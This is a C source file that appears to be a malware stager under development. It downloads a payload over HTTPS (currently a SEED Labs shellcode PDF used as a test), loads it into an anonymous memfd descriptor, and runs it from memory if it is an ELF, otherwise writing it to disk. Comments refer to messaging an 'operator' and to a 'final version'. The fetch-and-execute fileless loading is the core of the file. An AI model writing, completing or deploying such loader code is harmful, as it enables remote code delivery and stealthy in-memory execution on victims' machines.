#include <stdlib.h>
#include <stdio.h>
#include <unistd.h>
#include <sys/mman.h>
#include "detect.h"
#include "helpers.h"
#include "getHTTPS.h"

#define PAYLOAD_FILE "../test_files/test_ELF" // payload file to open, delete on final version

int main(int argc, char **argv){
    struct MemoryStruct payload;
    void *decrypted;
    void *decompressed;
    int payloadFD; // in memory file descriptor
    int writeReturnSize;
    int d; //to hold the return value of detect()
    char * payload_argv[] = {"../test_files/test_ELF", "testing", NULL}; // argv for payload
    char * payload_envp[] = {NULL}; // envp for payload
    char *pathToWrite = "../test_files/test_static_copy.pdf";
    
    
    // payloadFile = fopen(PAYLOAD_FILE, "r"); // open payload binary
    // size = fsize(payloadFile); // get size in bytes
    // payload = calloc(size, sizeof(unsigned char)); // allocate on heap
    // fread(payload, sizeof(unsigned char), size, payloadFile); // read file to heap
    // fclose(payloadFile); //close file


    payload = getHTTPS("https://seedsecuritylabs.org/Labs_20.04/Files/Shellcode/Shellcode.pdf");


    while ((payloadFD = memfd_create("payload", 0)) <= 2){ // create memory file descriptor for execution
        printf("memfd_create() failed. File descriptor created: %d\n", payloadFD);
        close(payloadFD);
        return -1;
    }

    writeReturnSize = write(payloadFD, payload.memory, payload.size);  // write to mem_fd and error check
    if (writeReturnSize != payload.size){
        printf("Writing to mem_fd failed. %d bytes written when %d bytes were supposed to be written.\n", writeReturnSize, (int)payload.size);
        return -1;
    }

    d = detect((unsigned char *)payload.memory); //determine if the payload is an executable/ELF

    if (d == 1){
        if (executePayload(payloadFD, payload_argv, payload_envp) == 0){
            //send message to operator
            return -1;
        } 
    } else {
        writeToDisk(payload.memory, pathToWrite, payload.size);
    }

    return 0;
}